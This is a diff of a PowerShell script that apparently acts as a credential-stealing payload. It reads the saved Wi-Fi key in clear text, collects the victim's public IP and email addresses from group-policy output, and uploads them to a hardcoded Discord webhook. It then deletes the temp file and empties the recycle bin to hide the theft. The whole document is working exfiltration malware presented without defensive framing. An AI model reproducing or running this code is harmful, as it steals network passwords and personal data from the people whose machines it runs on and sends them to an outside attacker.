@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$a=(netsh wlan show interfaces) | Select-String "SSID";$b=($a -replace '^\s*SSID\s*:\s*', '') -replace '\s*BSSID\s*:\s*[0-9A-Fa-f:]*', '';netsh wlan show profile $b key=clear | Format-Table -AutoSize | Out-String > $env:TEMP/--why1.txt
+$a=(netsh wlan show interfaces) | Select-String "SSID";$b=($a -replace '^\s*SSID\s*:\s*', '') -replace '\s*BSSID\s*:\s*[0-9A-Fa-f:]*', '';netsh wlan show profile $b key=clear | Format-Table -AutoSize | Out-String > $env:TEMP/--why.txt;$ip=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content;$e = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$e = ("$e").Trim();Add-Content -Path $env:TEMP/--why.txt "$ip $e" 
 
 ############################################################################################################################################################
 
@@ -14,7 +14,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+$hookurl = "$https://discord.com/api/webhooks/1174888099831095399/xotxoYfjQ-fXZYNrlhQUzsMfCcvQ3bags-AVP6lHlZBldWfA2l8KYVa7b6hHTzmWjiT4"
 
 $Body = @{
   'username' = $env:username
@@ -27,9 +27,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--why1.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--why.txt"}
 
- 
+
 
 ############################################################################################################################################################
 
@@ -54,4 +54,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI $env:TEMP/--why1.txt
+RI $env:TEMP/--why.txt
